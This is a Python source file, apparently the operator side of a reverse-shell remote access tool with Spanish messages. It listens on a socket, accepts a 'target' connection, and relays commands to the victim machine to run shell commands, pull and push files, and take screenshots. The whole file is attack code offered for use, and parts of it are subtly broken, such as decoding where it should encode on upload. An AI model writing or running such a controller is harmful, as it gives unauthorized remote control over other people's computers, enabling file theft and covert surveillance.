#!/usr/bin/env python


import re
import socket
import base64
from xmlrpc import server

def shell():
    current_dir=target.recv(1024)
    count=0
    while True:
        comando=input("Enter".format(current_dir))
        if(comando=="exit"):
            target.send(str.encode(comando))
            break
        elif(comando[:2]=="cd"):
            target.send(str.encode(comando))
            res=target.recv(1024)
            current_dir=res
            print(res)
        elif(comando==""):
            pass
        elif(comando[:8]=="download"):
            target.send(str.encode(comando))
            with open(comando[9:],"wb")as file_download:
                datos=target.recv(30000)
                file_download.write(base64.b64decode(datos))
        elif(comando[:6]=="upload"):
            try:
                target.send(str.encode(comando))
                with open(comando[7:],"rb")as file_upload:
                    target.send(base64.b64decode(file_upload.read()))
            except:
                print("error en la subida")
        elif(comando[:10]=="screenshot"):
            target.send(str.encode(comando))
            with open("monitor-%d.png"%count,"wb")as screen:
                datos=target.recv(10000000)
                data_decode=base64.b64decode(datos)
                if data_decode=="fail":
                    print("no se pudo tomar la captura de pantalla")
                else:
                    screen.write(data_decode)
                    print("Captura realizada")
                    count=count+1
        else:
            target.send(str.encode(comando))
            res=target.recv(3000000)
            if res =="1":
                continue
            else:
                print(res)
def upserver():
    global server
    global ip
    global target

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    server.bind(('localhost',8080))
    server.listen(10)

    print("Servidor en marcha esperando conexiones...")

    target, ip=server.accept()
    print("conexion recibida de : "+ str(ip[0]))

upserver()
shell()
server.close()